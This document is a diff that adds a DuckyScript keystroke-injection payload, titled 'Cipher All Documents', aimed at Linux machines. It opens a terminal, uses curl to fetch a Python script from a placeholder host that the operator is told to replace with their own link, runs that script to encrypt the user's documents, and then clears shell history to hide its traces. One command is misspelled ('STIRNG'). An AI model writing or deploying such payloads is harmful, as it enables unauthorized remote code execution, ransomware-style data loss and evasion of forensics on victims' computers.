@@ -1,0 +1,30 @@
+REM #######################################
+REM #                                     |
+REM # Title        : Cipher All Documents |
+REM # Author       : Aleff                |
+REM # Version      : 1.0                  |
+REM # Category     : Execution            |
+REM # Target       : Linux                |
+REM #                                     |
+REM #######################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Discord Webhook
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+REM Reply example.com with YOUR LINK. The Payload should be CipherAllDocumentsScript.py
+DEFINE PAYLOAD example.com
+STRING curl 
+STRING PAYLOAD
+STRING  > script.py
+ENTER
+
+REM It depends by the internet connection, btw 2/3 seconds is a lot for a fiew text line...
+DELAY 2000
+
+STIRNG python3 script.py; history -c; exit;
+ENTER
